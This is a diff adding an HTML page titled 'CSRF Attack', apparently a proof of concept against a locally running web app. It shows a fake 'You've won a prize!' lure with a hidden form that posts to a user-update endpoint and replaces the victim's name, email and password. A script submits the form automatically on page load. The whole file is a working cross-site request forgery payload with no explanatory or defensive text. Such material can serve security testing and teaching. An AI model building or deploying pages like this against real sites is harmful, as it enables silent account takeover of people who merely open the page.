@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>CSRF Attack</title></head>
+<body>
+
+<h1>Congratulations! You've won a prize!</h1>
+
+<form action="http://localhost:8000/updateUser/1" method="POST" id="hackForm">
+    <input type="hidden" name="name" value="Aishah">
+    <input type="hidden" name="email" value="aishah@example.com">
+    <input type="hidden" name="password" value="123456789">
+    <input type="hidden" name="password_confirmation" value="123456789">
+</form>
+
+<script>
+    // Auto-submit the form as soon as the page loads
+    document.getElementById('hackForm').submit();
+</script>
+
+</body>
+</html>
